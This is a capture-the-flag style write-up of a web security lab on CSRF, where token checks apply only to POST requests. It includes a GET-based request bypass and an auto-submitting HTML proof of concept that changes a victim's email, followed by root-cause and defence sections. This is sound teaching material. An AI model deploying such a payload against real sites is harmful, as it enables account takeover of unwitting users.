# 🔐 Lab: CSRF where token validation depends on request method

---

# 🧪 1. HOW I SOLVED THE LAB (Step-by-Step)

---

## 🔑 Step 1: Login

* Username: `wiener`
* Password: `peter`

---

## 🛰️ Step 2: Capture Request (Burp Suite)

* Go to **My Account → Change Email**
* Intercept request

```http id="s1"
POST /my-account/change-email HTTP/1.1
Cookie: session=abc123

email=test@gmail.com&csrf=TOKEN123
```

👉 Observation:

* CSRF token present ✅
* POST request protected ✅

---

## 🔍 Step 3: Test Method Change

👉 I removed POST method and converted request to GET:

```http id="s2"
GET /my-account/change-email?email=attacker@gmail.com HTTP/1.1
Cookie: session=abc123
```

👉 Result:

* ✔️ Request accepted
* ✔️ Email changed
* ❌ No CSRF token required

---

## 🧨 Step 4: Create CSRF PoC

```html id="s3"
<html>
  <body>
    <form action="https://LAB-ID.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="attacker@gmail.com" />
      <input type="hidden" name="csrf" value="1234" />
    </form>

    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

👉 Important:

* No `method="POST"` → default = GET
* Fake CSRF token used (ignored by server)

---

## 🌍 Step 5: Exploit

1. Open Exploit Server
2. Paste PoC
3. Click **Store**
4. Click **Deliver to victim**

---

## ✅ Step 6: Lab Solved

✔️ Email changed via GET
✔️ CSRF protection bypassed

---

# 🧠 2. WHY THIS WORKED

* Server validates CSRF token only for POST ❌
* GET request is not validated ❌
* Same functionality available via GET ❌

👉 Result:
CSRF bypass using method change

---

# 🚨 3. ROOT CAUSE

```php id="s4"
if (method == POST) {
    validate_csrf_token();
}
```

```php id="s5"
if (method == GET) {
    process_request(); // No validation ❌
}
```

---

# ❌ 4. DEVELOPER MISTAKES

### 🚫 Method-based protection

* Only POST secured
* GET ignored

---

### 🚫 State change via GET

* Email change allowed via GET

---

### 🚫 No strict validation

* Server trusts request blindly

---

# 🛡️ 5. PROPER DEFENSE

---

## ✔️ Enforce POST only

```php id="s6"
if (method != POST) reject();
```

---

## ✔️ Validate CSRF token everywhere

```php id="s7"
validate_csrf_token();
```

---

## ✔️ SameSite cookies

```http id="s8"
Set-Cookie: session=abc; SameSite=Strict
```

---

# ⚡ 6. KEY TAKEAWAYS

* CSRF protection should be **endpoint-based**, not method-based
* Never allow state-changing actions via GET
* Browser auto-sends cookies → root cause of CSRF

---

# 🧠 7. INTERVIEW ONE-LINER

👉
**"The application enforced CSRF protection only for POST requests, but the same functionality was accessible via GET without validation, allowing a method-based CSRF bypass."**

---
